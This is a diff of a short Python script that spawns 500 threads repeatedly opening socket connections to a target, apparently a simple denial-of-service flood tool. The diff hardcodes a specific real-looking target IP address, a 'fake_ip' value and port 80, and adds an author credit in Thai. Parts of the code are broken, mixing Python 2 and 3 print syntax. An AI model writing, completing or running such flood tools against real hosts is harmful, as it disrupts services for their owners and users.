@@ -1,13 +1,9 @@
 import socket
 import threading
-import sys
-import os
-import time
-import random
-print
-target = target("Target:")
-fake_ip = fake_ip("FakeIP:")
-port = port("Port:")
+print "ทำโดย Moment Ag"
+target = '101.109.41.50'
+fake_ip = '212.103.49.141'
+port = 80
 
 attack_num = 0
 
@@ -23,7 +19,8 @@ def attack():
         print(attack_num)
         
         s.close()
-
+        
 for i in range(500):
     thread = threading.Thread(target=attack)
-    thread.start()
+    thread.start()        
+        
